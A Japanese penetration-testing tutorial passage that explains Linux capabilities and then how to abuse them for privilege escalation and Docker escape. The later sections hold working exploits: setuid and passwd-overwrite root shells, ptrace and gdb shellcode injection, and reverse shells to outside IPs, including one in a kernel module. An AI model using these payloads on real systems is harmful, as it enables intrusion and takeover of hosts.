# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilitiesは、**root権限をより小さく独立した単位に分割**し、プロセスが権限の一部だけを持てるようにします。これにより、不要に完全なroot権限を付与しないため、リスクを最小限に抑えられます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 問題点:

- 一般ユーザーには、raw socketのオープンや1024未満のInternetポートへのbindなどの操作に対する権限がありません。capabilitiesを使えば、完全なroot権限ではなく、必要な操作だけを許可できます。<sup>[[14]](#references)</sup>

### Capability Sets:

Linuxはスレッドごとに以下のcapability setを公開しており、プロセスがcredentialを変更したりfileを実行したりする際に、kernelがその制約を適用します。<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **目的**: 実行されたfileに一致するinheritable file capabilitiesがある場合に、`execve()`後のpermitted setに追加される可能性があるcapabilitiesを識別します。
- **機能**: スレッドのinheritable setは`execve()`をまたいで保持されますが、それだけでcapabilitiesがeffectiveになるわけではありません。
- **制限**: このsetへのcapabilityの追加は、permitted setとbounding setによって制限されます。<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **目的**: プロセスがその時点で実際に利用しているcapabilitiesを表します。
- **機能**: さまざまな操作のpermissionを許可する際に、kernelがチェックするcapabilitiesのsetです。fileの場合、このsetは、そのfileのpermitted capabilitiesをeffectiveとして扱うかどうかを示すflagにできます。
- **重要性**: effective setは即時の権限チェックに不可欠であり、プロセスが使用できるcapabilitiesのactive setとして機能します。

3. **Permitted (CapPrm)**:

- **目的**: プロセスが保持できるcapabilitiesの最大setを定義します。
- **機能**: プロセスはpermitted setからcapabilityをeffective setへ昇格させ、そのcapabilityを使用できるようにできます。また、permitted setからcapabilitiesを削除することもできます。
- **境界**: このsetから削除したcapabilityは、通常、そのcapabilityを付与するfileを実行するか、別のprivileged transitionを行わない限り復元できません。<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **目的**: `execve()`中にfileから取得できるcapabilitiesと、inheritable setに追加できるcapabilitiesを制限します。
- **機能**: このsetは`fork()`をまたいで継承され、`execve()`後も保持されます。callerが`CAP_SETPCAP`を持っている場合、このsetからcapabilitiesを削除できます。
- **用途**: このsetから不要なcapabilitiesを削除すると、後の権限取得を制限できます。<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **目的**: nonprivileged programの`execve()`後も、選択したcapabilitiesをpermittedおよびeffectiveとして維持できるようにします。
- **機能**: 実行されたfileがprivilegedでない場合、ambient capabilitiesは新しいpermitted setおよびeffective setに追加されます。
- **制限**: capabilityがambientであり続けるには、permitted setとinheritable setの両方に存在している必要があります。set-user-ID/set-group-ID file、またはcapabilitiesを持つfileを実行すると、ambient setはクリアされます。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes & Binaries Capabilities

### Processes Capabilities

特定のプロセスのcapabilitiesを確認するには、/proc directory内の**status** fileを使用します。より詳細な情報が提供されるため、ここではLinux capabilitiesに関連する情報だけに限定します。\
なお、実行中のすべてのプロセスではcapability情報がスレッドごとに保持され、file capabilitiesは`security.capability` extended attributesに保存されます。<sup>[[14]](#references)[[15]](#references)</sup>

capabilitiesは/usr/include/linux/capability.hで定義されています。

現在のプロセスのcapabilitiesは`cat /proc/self/status`または`capsh --print`で確認でき、他のプロセスのcapabilitiesは`/proc/<pid>/status`で確認できます。<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5つのcapability行を返すはずです。<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味をなしません。`capsh` utilityを使用すると、capability namesにdecodeできます。<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
では、`ping` で使用される **capabilities** を確認します：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
これは機能しますが、別のより簡単な方法もあります。実行中のプロセスの capabilities を確認するには、**getpcaps** tool にプロセス ID（PID）を続けて指定します。プロセス ID のリストにも対応しています。<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
バイナリに `cap_net_admin` と `cap_net_raw` を付与してネットワークをスニッフィングした後、`tcpdump` の capabilities を確認します（`tcpdump` はプロセス 9562 で実行されています）。<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
ご覧のとおり、capabilities はプロセスを検査する2つの方法の結果に対応しています。`getpcaps` tool は libcap を使用して対象プロセスの capabilities を照会し、テキスト形式で出力します。1つ以上の PID を受け付けます。<sup>[[22]](#references)</sup>

### Binaries Capabilities

Binaries には、実行時に適用される file capabilities を設定できます。たとえば、`ping` binary には `cap_net_raw` capability が付与されている場合があります。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
`getcap -r` を使用して、capabilities が設定された binary を検索できます。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### capshでcapabilitiesを削除する

有効な bounding set から `CAP_NET_RAW` を削除すると、その capability を必要とするプログラムは、以後それを使用できなくなるはずです。<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを返すはずです。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーは、`CAP_NET_RAW` が bounding set から削除された後、要求された file capability では `tcpdump` を実行できないことを示しています。

### Capabilities の削除

`setcap -r` を使用すると、ファイルの capabilities を削除できます。<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## ユーザー Capabilities

Linux はファイル capabilities をログインユーザーに直接割り当てませんが、`pam_cap` PAM module は `/etc/security/capability.conf` を使用して、認証済みセッションに inheritable capabilities を設定できます。<sup>[[16]](#references)</sup> 各エントリでは、コンマで区切った capability 名または番号を、1 人以上のユーザー名に割り当てます。<sup>[[17]](#references)</sup>
ファイル例:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

以下のプログラムをコンパイルすると、**capabilitiesを提供するenvironment内でbash shellをspawn**できるようになります。<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた ambient binary によって実行される bash** 内では、**新しい capabilities** を確認できます（通常のユーザーは「current」セクションに capability を持ちません）。<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> 許可されたセットと継承可能なセットの両方に存在する capabilities のみ追加できます。<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb バイナリ

Capability-dumb バイナリとは、file capabilities を持つものの、それらを管理するために libcap を使用しないプログラムです。file effective bit が設定されている場合、kernel はそのファイルの permitted capabilities をプロセスの effective set で有効にします。プロセスがすべての permitted capabilities を取得していない場合、実行に失敗することがあります。<sup>[[14]](#references)</sup>

## Service Capabilities

root として実行される system service は、その実行環境によって制限されていない限り、広範な capabilities を保持する可能性があります。systemd unit では、`User=` が service user を選択し、`AmbientCapabilities=` が実行されるプロセスの ambient set に指定した capabilities を追加します。<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers 内の Capabilities

Docker はデフォルトの capability セットで containers を起動します。このセットは `--cap-add` と `--cap-drop` で変更できます。example container は `amicontained` で検査できます。<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities は、**特権操作を実行した後に自身のプロセスを制限したい場合**（例: chroot を設定してソケットに bind した後）に便利です。しかし、悪意のあるコマンドや引数を渡すことで悪用でき、それらは root として実行されます。<sup>[[2]](#references)</sup>

`setcap` を使ってプログラムに file capabilities を強制的に設定し、`getcap` で確認できます。<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
ファイル capability text では、`+ep` は指定された capability を effective set と permitted set に追加し、`-` は選択した flags を下げます。<sup>[[21]](#references)</sup>

システムまたはフォルダー内で capability を持つプログラムを特定するには、`getcap -r` を使用します。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation の例

次の例では、binary `/usr/bin/python2.6` に privesc の脆弱性があることが確認されています:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities**：`tcpdump` が**任意のユーザーにパケットを sniff させる**ために必要なもの：
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### 「空の」capabilities の特殊なケース

ファイルは空の capability set を持つことがあります（`getcap myelf` は `myelf =ep` を返します）。空の set は capabilities を一切付与しませんが、root 所有の set-user-ID bit と組み合わせると、file capabilities を取得せずに、プログラムが実行中の process の effective ID と saved ID を 0 に変更できます。所有者のない、SUID/SGID ではない `=ep` ファイルは root として実行されません。<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、device の mount や kernel feature の操作など、広範な **administrative privileges** を持つため、しばしば root に近いレベルと見なされます。システム全体をシミュレートする container には不可欠ですが、**`CAP_SYS_ADMIN` は重大な security challenge をもたらします**。特に containerized environment では、privilege escalation や system compromise につながる可能性があるためです。したがって、その使用には厳格な security assessment と慎重な管理が必要であり、**principle of least privilege** に従い attack surface を最小化するため、application-specific container ではこの capability を drop することが強く推奨されます。<sup>[[14]](#references)</sup>

**binary の例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます。
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します。
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使って **root として `su`** できるようになります。

**環境を使用した例（Docker breakout）**

以下を使用して、Docker container 内で有効になっている capabilities を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力から、SYS_ADMIN capability が有効になっていることがわかります。<sup>[[14]](#references)</sup>

- **Mount**

適切な device および namespace への access がある場合、これにより Docker container が**host disk を mount し、その contents に access する**ことが可能になります。<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **完全なアクセス**

前の方法では、host のディスクにアクセスできました。\
host で **ssh** サーバーが実行されている場合、**マウントされたディスク内にユーザーを作成**し、SSH 経由でアクセスできます。<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` により、プロセスは自身の PID namespace から参照可能な他のプロセスを trace および inspect できます。Docker container から host のプロセスを対象にするには、`--pid=host` で host の PID namespace を共有するか、対象プロセスを含む namespace に join します。<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` が提供する debugging および system call tracing 機能と、`process_vm_readv(2)` や `process_vm_writev(2)` のような cross-memory attach call を使用する権限を付与します。diagnostic や monitoring の目的では強力ですが、`ptrace(2)` に対する seccomp filter のような制限手段なしで `CAP_SYS_PTRACE` が有効になっていると、system security が大きく損なわれる可能性があります。具体的には、[この proof of concept (PoC) のようなもの](https://gist.github.com/thejh/8346f47e359adecd1d53)で実証されているように、特に seccomp によるものなど、他の security restriction を回避するために悪用できます。<sup>[[10]](#references)</sup>

**バイナリを使った例（python）**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**binaryを使用したExample（gdb）**

`ptrace` capabilityを持つ`gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
gdbを介してメモリにinjectするshellcodeをmsfvenomで作成する
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdbでrootプロセスをデバッグし、先ほど生成したgdbの行をコピー＆ペーストします：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使用した例（Docker breakout）- Another gdb Abuse**

**GDB** がインストールされている場合（例えば `apk add gdb` または `apt install gdb` でインストールできます）、**ホストからプロセスをデバッグ**し、`system` 関数を呼び出させることができます。（この technique には capability `SYS_ADMIN` も必要です）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
実行されたコマンドの出力を確認することはできませんが、そのプロセスによって実行されます（そのため、rev shell を取得します）。

> [!WARNING]
> エラー「No symbol "system" in current context.」が表示された場合は、gdb 経由でプログラムに shellcode を読み込む前の例を確認してください。

**環境を使用した例（Docker breakout） - Shellcode Injection**

以下を使用して、docker コンテナ内で有効になっている capabilities を確認できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host**で実行中の**processes**を一覧表示 `ps -eaf`

1. **architecture**を取得 `uname -m`
2. architecture用の**shellcode**を探す ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**をprocess memoryに**inject**するための**program**を探す ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **program**内の**shellcode**を**Modify**して、compileする `gcc inject.c -o inject`
5. **Inject**して**shell**を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**は、processによる**kernel modulesのloadおよびunload（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）**を可能にし、kernelのcore operationsへ直接アクセスできるようにします。このcapabilityは、moduleのloadによってkernelの動作が変更され、isolation boundariesが回避される可能性があるため、重大なsecurity risksをもたらします。<sup>[[6]](#references)[[14]](#references)</sup>
**これにより、processから認識できるkernel内のmodulesをinsertまたはremoveできます。container内では、それがhost kernelに対して行われるかどうかはisolation configurationに依存します**。<sup>[[14]](#references)</sup>

**binaryを使用した例**

次の例では、**`python`**というbinaryがこのcapabilityを持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** 内の依存関係リストおよび map ファイルを確認します。\
これを悪用するため、偽の **lib/modules** フォルダーを作成します：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下にある2つの例のカーネルモジュールを**コンパイル**し、このフォルダにコピーします。
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、この kernel module を読み込むために必要な python code を実行します。
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binary を使った例 2**

次の例では、binary **`kmod`** にこの capability があります。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
つまり、**`insmod`** コマンドを使用して kernel module を挿入できます。以下の例に従い、この privilege を悪用して **reverse shell** を取得します。

**環境での例（Docker breakout）**

以下を使用して、Docker コンテナ内で有効な capabilities を確認できます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**SYS_MODULE** capability が有効になっていることが確認できます。<sup>[[14]](#references)</sup>

**reverse shell** を実行する **kernel module** と、それを **compile** するための **Makefile** を **作成**します：
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
